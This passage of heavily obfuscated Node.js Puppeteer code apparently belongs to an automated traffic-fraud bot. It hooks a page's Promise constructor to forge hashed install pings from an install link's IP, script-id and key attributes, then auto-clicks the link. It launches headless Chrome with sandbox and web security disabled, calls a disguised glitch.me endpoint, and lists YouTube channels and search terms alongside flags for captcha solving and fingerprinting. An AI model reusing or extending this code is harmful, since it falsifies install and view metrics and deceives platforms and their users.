& 0x97 * 0x1d + -0x17f + -0xf5d) << y[-0x9c8 * -0x2 + -0x81c + -0xb71 & N++], P[N >> 0x11 * -0xbb + 0xec7 + -0x25a] |= (0x10dc * 0x1 + 0x4f * -0x41 + 0x3b3 | L >> 0x1a3 * -0x16 + -0x811 + -0x47 * -0x9f & 0x1c74 + 0x1987 + -0x35bc) << y[-0xbee + 0x9ef * 0x1 + -0x101 * -0x2 & N++], P[N >> -0x2074 + 0x250 + 0x1e26] |= (0x127d * 0x1 + 0x58 * 0x68 + 0x35bd * -0x1 | 0x19cc + 0x34f * -0xb + 0x1 * 0xad8 & L) << y[0x2636 + 0x1 * -0x127d + -0x13b6 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x2344 + -0x768 + 0x174 * -0x13 ? (this['block'] = P[-0x1fd3 + -0x13f9 * 0x1 + 0x33dc], this['start'] = N - (0x1ab6 + -0x1fb9 + 0x543), this['hash'](), this['hashed'] = -0x7 * -0x1b3 + -0x1d4b + 0x5cd * 0x3) : this['start'] = N;
                }
                return this['bytes'] > -0x8284c8d * 0x2b + 0x1649d434 + 0x2487b077a && (this['hBytes'] += this['bytes'] / (-0x4fad9a84 + -0x1e03dcc6 * 0xe + 0x2f3e3ad58) << 0x2b * -0xdb + 0xa4 * 0x17 + 0x160d, this['bytes'] = this['bytes'] % (0x52c5b910 + 0x3dc63a48 + 0x2 * 0x37ba0654)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x17c8 + 0x1306 + 0x4c3;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1f89 + 0xc94 + 0x3 * -0xeaf] = this['block'], J[K >> -0x181a + 0x1d9 + 0x1643] |= x[0x1 * -0xe11 + 0x4e4 * 0x1 + 0x930 & K], this['block'] = J[-0x1 * -0x2295 + 0x7d * -0x1a + -0x15d3], K >= -0x190 + -0x16cf + 0x1897 && (this['hashed'] || this['hash'](), J[-0x9b4 + 0x2 * -0xc2e + 0x221 * 0x10] = this['block'], J[0x1bdc + 0x4f * 0x4a + -0x32a2] = J[0x1247 * 0x2 + -0x44 + -0x1 * 0x2449] = J[-0x1 * -0x16e1 + -0x1f28 + -0x65 * -0x15] = J[0x388 * 0x9 + -0x1 * -0x1499 + 0x1a2f * -0x2] = J[-0x1002 + -0x1407 * 0x1 + 0x240d * 0x1] = J[0x83 * -0x1f + 0x2089 + -0x10a7] = J[0xe61 + 0xced + -0x3 * 0x918] = J[0x5 * 0x203 + 0x7ea + -0x11f2 * 0x1] = J[0x1 * -0x113c + -0x17bc + -0x100 * -0x29] = J[0x1 * -0x16f9 + -0x29d * 0x8 + 0x4d * 0x92] = J[0x25c7 + 0x19e1 + -0x1fcf * 0x2] = J[-0x5ec + 0x26 * 0x100 + -0x2009] = J[0x2329 + 0x25e2 + -0x48ff] = J[0x1d06 + 0x1fbb + -0xf * 0x40c] = J[-0x2cf * 0x7 + -0xa1 * -0x7 + 0xf50] = J[0x2643 + -0xeb8 + -0x5df * 0x4] = -0x1 * -0x1365 + -0x366 + -0xfff), J[0x1e77 + 0x210e + -0x3f77] = this['hBytes'] << 0xa * -0x15a + -0xdb * -0x19 + -0x7dc | this['bytes'] >>> -0x11bd + -0x642 + -0x607 * -0x4, J[-0x1906 * -0x1 + -0x590 + 0x1367 * -0x1] = this['bytes'] << 0x9cb + 0x1a51 + 0x1 * -0x2419, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x7f * -0x3e + 0x2107 + -0x235; J < -0x2d * -0xbd + 0x4d + -0x27 * 0xda; ++J)
                K = Q[J - (0xf5f + 0x164 * 0x3 + -0x1388)] ^ Q[J - (0xe * 0xdb + -0xde + 0x2c5 * -0x4)] ^ Q[J - (0x26b5 + 0x773 * -0x2 + -0x17c1)] ^ Q[J - (0x1 * 0xadb + 0x43 * -0x93 + 0x1bae)], Q[J] = K << -0x495 * 0x5 + 0x1f3 * 0x4 + -0x2d * -0x56 | K >>> -0x1c3d + -0x6 * 0x301 + 0x2e62;
              for (J = -0x68e * 0x5 + -0x36 + 0x1 * 0x20fc; J < 0x897 + -0x575 + -0x30e; J += -0x1cd3 * 0x1 + -0xc02 + 0x28da)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x208d + 0xd21 * -0x1 + 0x1 * 0x2db3 | L >>> 0x4 * -0x137 + -0x2514 + -0x2f * -0xe5) + (M & N | ~M & O) + P + (-0x7faf64c2 + 0x43a4fa31 * 0x1 + 0x968ce42a) + Q[J] << 0x2e7 * -0x5 + -0x25e + -0x1 * -0x10e1) << 0x5b * 0x6d + 0x1c99 * -0x1 + -0xa21 | P >>> -0x1d5 * 0x4 + 0x3ac + 0x141 * 0x3) + (L & (M = M << -0xb * -0x24b + 0x957 + 0x2272 * -0x1 | M >>> 0x26c * 0x1 + -0x1 * 0x26d5 + 0x1 * 0x246b) | ~L & N) + O + (-0x1 * 0x385e836f + 0x18b9623c + -0x36 * -0x2431a92) + Q[J + (0x1 * -0x90d + -0x721 + -0x565 * -0x3)] << 0x1c37 + 0xa7d + -0x26b4) << 0x13b8 + 0x1 * -0x68 + -0x134b | O >>> 0x1ef7 + 0x60b + 0x24e7 * -0x1) + (P & (L = L << 0x1085 + -0x12 * 0x1a5 + 0x6d * 0x1f | L >>> 0x2041 + 0xa6e + -0x1db * 0x17) | ~P & M) + N + (-0x9001e669 * -0x1 + -0x26dc3ec6 + -0x1 * 0xea32e0a) + Q[J + (-0x11c9 + -0x285 + -0x64 * -0x34)] << 0x2 * -0x352 + 0x60e + -0x96 * -0x1) << 0xc * -0x163 + 0x1e13 + -0x11 * 0xca | N >>> -0x26fa + -0x412 * -0x2 + -0x59 * -0x59) + (O & (P = P << -0x4cd * 0x6 + -0x2c + 0x1d18 | P >>> -0x5bf + 0x3cb * 0x2 + -0x1d5) | ~O & L) + M + (0xa066776 + 0x6c014213 * 0x1 + 0x1cdfac * -0xf4) + Q[J + (0xbcb * -0x1 + -0xcdb * -0x2 + 0x4 * -0x37a)] << -0x17d * 0x1 + 0x3d3 * -0x7 + 0x1c42) << -0x1e75 + -0x1cc7 + 0x7 * 0x877 | M >>> -0x1 * -0x1b94 + 0x2015 + -0x441 * 0xe) + (N & (O = O << 0x1 * -0x2f0 + 0x1c76 * 0x1 + 0x65a * -0x4 | O >>> 0xe7 * 0x2b + 0x6c6 + 0x1 * -0x2d91) | ~N & P) + L + (-0xf1120f * 0x48 + 0x36552533 + 0x67fa689e) + Q[J + (-0x20a4 + -0x1dc0 + 0x3e68)] << -0x73a * 0x1 + 0xe80 + -0x746, N = N << -0x10e2 + -0x130 + 0x48c * 0x4 | N >>> -0x1941 + -0x6 * -0x3b8 + -0x5 * -0x97;
              for (; J < -0x1e82 + -0x1706 + 0x35b0; J += 0x1 * -0x1a05 + 0x10 * -0x151 + 0x2f1a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x17ef + -0x1 * 0x26b9 + 0x5 * 0xc89 | L >>> -0x7 * -0xe8 + 0x2508 + -0x2b45) + (M ^ N ^ O) + P + (-0x610dcc01 * 0x1 + 0xbb * 0x54e8c9 + 0x91e1accf) + Q[J] << 0x15c * -0x7 + -0x1af * -0x1 + 0x7d5) << -0xe7f + -0x1f * -0x16 + 0x2 * 0x5ed | P >>> 0x24b9 * 0x1 + -0x84b * 0x2 + -0x1408) + (L ^ (M = M << 0x2 * 0x781 + -0x1119 + 0x235 | M >>> 0xf * -0x1cd + 0xf38 + 0xbcd) ^ N) + O + (0x284e01 * 0x43d + 0x48bca276 + 0x425aa889 * -0x2) + Q[J + (-0xb97 * 0x1 + -0x47 * 0x5b + 0x24d5)] << -0x2111 + 0x1489 + -0x644 * -0x2) << 0x7 * 0x77 + 0x258 + -0x33 * 0x1c | O >>> 0x1 * 0x1d5c + 0x1b25 + -0x3866) + (P ^ (L = L << -0x22ac + -0x550 + -0x3 * -0xd5e | L >>> -0x71 * -0x27 + 0x32 * -0x7d + 0x735) ^ M) + N + (-0x4295 * -0x3076 + -0x26e * -0x27c2b9 + 0x13 * 0x161d57) + Q[J + (0x170f * -0x1 + 0x66e * 0x1 + 0x10a3 * 0x1)] << -0x1252 * -0x2 + 0x344 * 0x3 + -0x2e70) << -0xa3f * 0x1 + -0x28f * -0xd + -0x16ff | N >>> 0x4b3 * -0x8 + 0xd * 0x133 + -0x14 * -0x11b) + (O ^ (P = P << -0x227b + 0x1 * -0x2393 + 0x462c | P >>> -0x75f * 0x5 + -0x21be + 0x469b) ^ L) + M + (-0xd68d9d5f + 0x2 * -0x24e144c + 0x14a03b198) + Q[J + (-0x27 * 0x1 + -0x6a * -0x39 + -0x1770)] << -0xd3e + 0x22a4 + -0x1566) << -0x1321 + -0x1cc9 * -0x1 + -0x9a3 | M >>> 0x1b7d + -0x14cb + -0x697) + (N ^ (O = O << -0x2360 + -0x7 * 0x36d + 0x3b79 | O >>> 0x93 * -0xd + -0x4 * 0x6ef + 0x1 * 0x2335) ^ P) + L + (-0x57bc89 * 0xfb + -0xba5a1 * 0x1cf + 0x48a57161 * 0x3) + Q[J + (0x1ace + 0x2b3 * 0x2 + -0x2030)] << 0x1b * -0xda + 0x2144 + -0xa46, N = N << -0x1342 + 0x107b + 0x2e5 | N >>> -0x1 * -0xcd2 + -0x19e5 + -0x11 * -0xc5;
              for (; J < 0x4d3 * 0x4 + -0x175 * 0x2 + -0x1026; J += -0x6be * 0x2 + 0xe28 + 0x1 * -0xa7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1e49 + 0x73 * -0x4f + -0xbf * -0x7 | L >>> 0x2 * -0x878 + -0x7 * 0x485 + -0x6 * -0x81d) + (M & N | M & O | N & O) + P - (-0x2ae44a0e + 0x6ef01bdf + -0xef2d071 * -0x3) + Q[J] << -0x8f * -0xb + -0x23b * -0x11 + -0x2c10) << 0x254e + -0x2230 + -0x3d * 0xd | P >>> -0xfd0 + -0xc48 + 0x1c33) + (L & (M = M << 0xe57 * -0x1 + -0x18ff + -0x32 * -0xca | M >>> 0x1 * -0x2312 + -0x5 * 0x2d3 + 0x3133) | L & N | M & N) + O - (-0x1 * -0x1761b692 + 0x5af947d2 + 0x176bb40 * -0x1) + Q[J + (0x100a * 0x1 + 0x831 + 0x7 * -0x376)] << 0x23 * -0x7a + -0x1 * 0x1fff + 0x30ad) << -0x1c7 + 0x217c * 0x1 + -0x2 * 0xfd8 | O >>> 0x1945 + 0x1423 + 0x1 * -0x2d4d) + (P & (L = L << 0x9e1 * -0x2 + 0x21c6 + -0xde6 | L >>> 0x1e61 + -0xf61 + 0x26 * -0x65) | P & M | L & M) + N - (-0x9 * 0x43d9a09 + -0x50c2f92e + 0xe7d1a6a3) + Q[J + (0x103b + -0x3 * 0x43d + 0x382 * -0x1)] << -0xa * 0xb4 + 0x1 * 0xae7 + -0x1 * 0x3df) << 0x9bf + 0x1c3 + -0xb7d | N >>> -0x4 * -0x9a0 + 0x1081 + -0x36e6) + (O & (P = P << -0x1 * 0x2683 + 0x1 * 0x20cf + 0x5d2 | P >>> 0x31 * 0xb5 + 0x61 * -0x57 + -0x1ac) | O & L | P & L) + M - (0x1c5d2352 + -0x3ba04562 + 0x7c18e * 0x1296) + Q[J + (0xc7 * 0x29 + -0x2507 * 0x1 + 0x52b)] << -0x907 + -0xb58 + 0x5 * 0x413) << 0x2 * 0x79 + 0x2211 + -0x22fe | M >>> -0x2548 + -0x11f1 + -0x1baa * -0x2) + (N & (O = O << 0x2553 + -0x382 * 0x1 + -0x1 * 0x21b3 | O >>> -0x5c2 + 0xd + 0x5b7) | N & P | O & P) + L - (-0xe533fc5 + 0x3 * 0x94306a3 + 0x636e6f00) + Q[J + (0x2647 + 0x19bb + 0x1 * -0x3ffe)] << 0x659 + -0x1cbc + -0x209 * -0xb, N = N << 0x15a + -0x3e * 0x31 + 0xaa2 | N >>> 0x268f + -0x142 + 0x1 * -0x254b;
              for (; J < 0x24c6 + 0x6d * 0x25 + -0x1 * 0x3437; J += 0xad7 + -0xb * -0x168 + -0x1a4a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x146a + 0x24cb * -0x1 + 0x32 * 0x125 | L >>> 0xe4d + -0x1 * 0x80b + -0x9 * 0xaf) + (M ^ N ^ O) + P - (-0x1f23fd * -0x1d3 + -0xe34a33 * 0x1 + -0x24e1e2a) + Q[J] << -0x232 * 0xa + -0x1 * -0x45 + 0x1 * 0x15af) << 0x603 + -0xdd8 + 0x7da | P >>> 0x1 * -0x17d7 + 0x173c + 0xe * 0xd) + (L ^ (M = M << 0x21d6 + -0x178 * -0x9 + -0x2ef0 | M >>> -0xe2 * -0x2 + -0x1 * -0x9dc + -0xb9e) ^ N) + O - (0x189b1fe7 * -0x3 + -0x465bb45b * -0x1 + 0x3912e984) + Q[J + (0x121 * -0x4 + -0x6aa * -0x3 + -0xf79)] << 0x79a * -0x4 + -0x16bf * 0x1 + -0x1 * -0x3527) << -0xb49 + -0x5d * -0x53 + -0x12d9 | O >>> 0x2457 + 0x1632 + -0x22a * 0x1b) + (P ^ (L = L << 0xd3b + -0x65a + -0x6c3 | L >>> -0xbc * 0xf + -0x62a + 0x1130) ^ M) + N - (0x21a66c9e + 0x89f2 * -0xb719 + 0x3b502417 * 0x2) + Q[J + (0x2271 + 0x18be + -0x3b2d)] << 0x1741 + 0x1f4e + -0x368f * 0x1) << 0x1a95 + -0xee7 + -0xba9 | N >>> -0x6 * -0x229 + 0x208f * -0x1 + 0x13b4) + (O ^ (P = P << -0x1 * 0x2171 + 0x58 * -0x19 + 0x2a27 | P >>> -0x1bb9 + -0x189e + -0x5d1 * -0x9) ^ L) + M - (0x67509c68 + 0xd * 0x7a15023 + -0x94e47005) + Q[J + (0xffe + -0x74 * -0x1a + -0x1bc3)] << 0x149e + 0x20f6 + -0x3594) << -0x86f * 0x3 + -0x316 * -0x7 + 0x4 * 0xee | M >>> 0x1cef + -0x3ab * -0xa + -0x6 * 0xaeb) + (N ^ (O = O << -0x4 * -0x683 + -0xd19 * -0x1 + -0x2707 | O >>> -0x2 * 0xf59 + -0x2623 + 0x44d7) ^ P) + L - (0x55739 * 0xc57 + -0x1842dc5f + 0xbf8ca2a) + Q[J + (-0x13db + -0x1895 * 0x1 + -0x5 * -0x8e4)] << 0x5 * -0x2a5 + 0x81 * 0xb + -0x2 * -0x3d7, N = N << 0x514 + 0x49c + -0x992 | N >>> 0x1c1c + 0x251d + 0x951 * -0x7;
              this['h0'] = this['h0'] + L << -0xa6b * 0x1 + 0x1 * -0x19c0 + 0x242b, this['h1'] = this['h1'] + M << 0x2413 + 0x1 * -0x22d1 + -0x142, this['h2'] = this['h2'] + N << -0x1 * -0x1a03 + 0xab1 + 0x6 * -0x61e, this['h3'] = this['h3'] + O << -0xda3 + -0x2e8 + -0x5 * -0x34f, this['h4'] = this['h4'] + P << -0x2533 + 0xffa + 0x1539 * 0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xe02 + -0x3 * 0xaed + -0xb3 * -0x1b & 0x1 * 0x15a6 + -0x115f + -0x4 * 0x10e] + w[J >> 0xaf7 + 0xc * 0x3d + 0x25 * -0x5f & 0x161b * -0x1 + -0x741 + 0x1d6b] + w[J >> 0x6e * 0x1b + 0x10 * -0xb1 + 0x3b * -0x2 & 0x2708 + 0x7 * -0x389 + -0x1 * 0xe3a] + w[J >> 0xc3 * 0x1d + -0x1f2c + 0x925 & -0x3bb * -0x3 + -0x1d4a + 0x1228] + w[J >> 0x662 + -0x1063 + 0xa0d & -0x489 + -0x9f * 0x16 + 0x1242] + w[J >> 0xde5 + 0xaf4 + 0x18d1 * -0x1 & -0x695 + -0x1 * -0x17 + 0x68d] + w[J >> 0x141a + -0x10b9 + -0x1 * 0x35d & -0x6f7 * -0x1 + -0x17 * -0x13e + 0x11bd * -0x2] + w[-0x13cc + -0xa3 * 0x1f + -0x2 * -0x13cc & J] + w[K >> 0x22d * -0x6 + 0x4a6 + -0x1b4 * -0x5 & -0x187 * -0x6 + -0x24c8 + 0x1bad] + w[K >> -0x1790 + 0x7 * 0x1c1 + 0xb61 * 0x1 & -0x2 * 0xae1 + -0x20a1 + -0x45 * -0xca] + w[K >> 0x1 * -0x2185 + 0x2 * 0x801 + -0x4f * -0x39 & -0x1a * -0xeb + -0x15a8 + -0x1 * 0x227] + w[K >> 0x4ae * 0x5 + 0x3a9 * 0x2 + -0x1ea8 & 0x13a * -0x1a + -0x9 * 0x369 + 0x3ea4] + w[K >> -0x3fa * 0x7 + -0xd97 + 0x2979 & 0x48e + 0x267 * -0xd + 0x1 * 0x1abc] + w[K >> 0x1776 + -0x79 * 0x1 + -0x16f5 & 0x2198 + -0x3f + -0x214a] + w[K >> 0xdcf + -0x183e + -0x19 * -0x6b & 0x1 * 0x697 + -0x696 + -0xe * -0x1] + w[0x5e7 * -0x5 + 0x13bb + 0x9d7 & K] + w[L >> 0xfb4 + -0xbb5 + -0x3e3 & 0x24b4 + 0x1 * -0x121f + 0x1 * -0x1286] + w[L >> 0x1f * 0x16 + -0x150b * 0x1 + 0x1 * 0x1279 & -0x52a * -0x3 + -0x11 * 0x98 + -0x557] + w[L >> 0x1d41 + -0xcce + -0x21 * 0x7f & 0x181f + 0x23d * -0x9 + -0x3eb * 0x1] + w[L >> 0x1f80 + 0xc6 + -0x2036 & -0x12 * 0x184 + -0x1b7 * 0x13 + -0x49c * -0xd] + w[L >> 0x2456 + -0xb5 * 0x35 + 0x12f & -0x2439 + 0x241 * -0x1 + 0x2689] + w[L >> 0x1b1a + -0x1b76 + -0x2 * -0x32 & -0x15fc + 0x1cd + -0x1 * -0x143e] + w[L >> -0x1 * 0x3 + -0x8a9 * -0x1 + -0x8a2 & -0x168c + -0x1402 + 0x2a9d] + w[-0x1058 * 0x1 + -0x1 * 0x1af3 + 0x2b5a * 0x1 & L] + w[M >> -0x26ee + -0x5 * -0x165 + -0x2011 * -0x1 & 0x1de7 + 0x5 * -0x343 + 0x1 * -0xd89] + w[M >> -0x12c2 * 0x2 + 0x165 * -0xb + -0x5 * -0xa97 & -0x234 * -0x7 + -0x1 * -0x1b46 + -0x2aa3] + w[M >> 0x10f4 + 0x16f + -0x124f & 0x1ae9 + -0x1 * -0x1d4a + 0x3824 * -0x1] + w[M >> -0x2a2 * -0x8 + -0xada * -0x1 + 0x3 * -0xa9e & 0x63 * -0x2a + -0x1d6e + -0x17 * -0x1fd] + w[M >> 0x1bc0 + -0x26e2 + -0x1b * -0x6a & 0x1be5 + 0x1 * -0x9dd + -0x11f9] + w[M >> 0x51 * 0x3d + -0x1b1 + -0x1194 & -0x1f * -0xd6 + 0x1bc9 + -0x35a4] + w[M >> -0x3a * 0xa1 + 0xba8 + -0x121 * -0x16 & -0x22a4 * -0x1 + 0x1ca3 * 0x1 + -0x3f38] + w[0x1 * -0x59c + -0x22d1 + 0x287c & M] + w[N >> 0x1e1b + -0x1 * -0x2089 + -0x3e88 & 0x1 * 0x1683 + -0xa * -0x3a1 + 0x92 * -0x67] + w[N >> 0x1 * -0x1fe8 + -0xb4 + 0x20b4 & 0x101f * -0x1 + -0x1244 + 0x1 * 0x2272] + w[N >> 0x1d2 + 0x1 * -0x45d + 0x29f * 0x1 & 0x161e + 0xc9b + -0x22aa] + w[N >> 0x3 * -0x599 + -0x11a8 + 0x2283 & -0x1b9a + -0x5f * -0x1b + -0x11a4 * -0x1] + w[N >> -0x75d + 0xb67 + -0x7 * 0x92 & 0x17d9 + -0xeaa + -0x920] + w[N >> 0x9d3 * 0x1 + -0x10da + -0xd * -0x8b & 0x1 * -0x887 + -0x883 * 0x1 + 0x1119] + w[N >> -0x1119 + 0x1 * -0x242b + 0xaa8 * 0x5 & 0x1a45 * 0x1 + -0x959 * -0x3 + -0x3641] + w[-0x71 * 0x1 + -0xd02 + 0x5b * 0x26 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xd58 + -0x167 * -0x4 + 0x8e * -0x22 & -0x2f * 0x88 + -0xe3 * 0x13 + 0x2 * 0x1568,
                J >> 0xb01 + 0x2e7 * -0x2 + -0x523 & -0x1543 * -0x1 + -0xe * 0x122 + -0x468,
                J >> -0x10ef + -0x1117 + 0x220e * 0x1 & -0x6a0 * -0x1 + 0xeb9 * -0x1 + 0x918,
                -0x1042 + 0xace + 0x673 & J,
                K >> 0x16ab + 0x1b23 + 0x9 * -0x586 & -0x4 * 0x957 + -0x48b + 0x2ae6,
                K >> 0x5 * 0x6ad + -0x11e1 * -0x2 + 0x1 * -0x4513 & 0x263b + 0x13 + 0x254f * -0x1,
                K >> -0x2 * 0xe35 + 0x19d7 + 0x29b & -0x16d7 * 0x1 + 0x127 * -0xa + 0x2 * 0x11ae,
                0x6e9 + 0x1352 + -0x193c & K,
                L >> 0x1105 + -0x2c * 0x7c + -0x1 * -0x463 & 0x1 * 0x35f + -0x1 * 0x13a2 + -0x8a1 * -0x2,
                L >> 0x100f + 0x197c + 0x29 * -0x103 & 0x12f4 + 0x2653 + -0x3848,
                L >> 0x3 * 0x846 + -0xb5 * -0x1f + 0xb * -0x43f & -0x7fd + -0x1138 + 0x1a34,
                0x1f81 * -0x1 + 0x2542 + -0x4c2 & L,
                M >> -0x695 + -0x126c + -0x1 * -0x1919 & -0xb9e * 0x1 + -0x251d + 0x4f9 * 0xa,
                M >> 0x132f + -0xf9a * 0x1 + -0x385 * 0x1 & 0x10b2 + -0x9b8 * 0x3 + -0x5 * -0x2b1,
                M >> -0xf77 + -0x5 * 0x316 + 0x1eed & -0x6 * 0xf0 + 0x5f8 + -0x1 * -0xa7,
                -0x56b + 0x18f4 * -0x1 + 0x1f5e & M,
                N >> 0x609 + -0x1b76 + -0x7 * -0x313 & -0x1fc1 + -0x2 * -0x1dd + 0x1d06,
                N >> -0x1ec4 + 0x144 * -0x12 + -0x1 * -0x359c & -0x2352 + 0x1 * -0x1b9d + 0x3fee,
                N >> 0x11c0 + -0x144e * -0x1 + -0x2606 & -0x1567 + 0x497 * -0x3 + -0xc5 * -0x2f,
                -0x7ad + -0x1860 + 0x210c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x2 * 0x5cb + 0x8cf + -0x1451), (K = new DataView(J))['setUint32'](0x1 * 0xca3 + 0x434 * -0x7 + 0x10c9, this['h0']), K['setUint32'](0x1f68 + -0x191f + -0x645, this['h1']), K['setUint32'](0x127a + 0x6a1 + -0x1913, this['h2']), K['setUint32'](-0xf68 + 0xff7 + -0x83, this['h3']), K['setUint32'](-0xb24 + -0x26db + 0x320f, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0xe5f + -0x1ae6 + -0x841 * -0x5];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x32f * -0x7 + 0x20b5 + -0x536 * 0x2;
            J[0x7e7 * 0x1 + 0x804 + 0xa3 * -0x19]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1f * -0x2b + -0x12a * -0x16 + -0x6cd * 0x3] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * 0x23ea + 0x1751 + 0xc9a), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x11 * -0x225 + 0x29 * 0xeb + -0x12d;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1eab + 0x3d3 * -0x5 + -0x5b0), Promise['resolve'](-0x2033 + 0x1c06 + -0x42e * -0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1ea4 + -0x3a5 + 0x2249; j < 0x2 * -0x1329 + 0x4 * -0x73b + -0x139 * -0x37; j++)
    i();
}
const NETWORK_PATIENCE = 0x7f * 0x32 + 0x2e5f + -0x3 * 0xd4f + (0x21 * -0x3 + -0x169e + -0x1 * -0x22b9) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x7 * 0x10 + 0xb * 0x303 + 0x1 * -0x218e) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + W(0x4),
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + X(0x2, 'F%X4'),
    X(0x13, '1MzE') + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1c7 * -0x2 + 0x1af + 0x1df; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x5da + -0x15 * -0x17f + -0x1991 * 0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 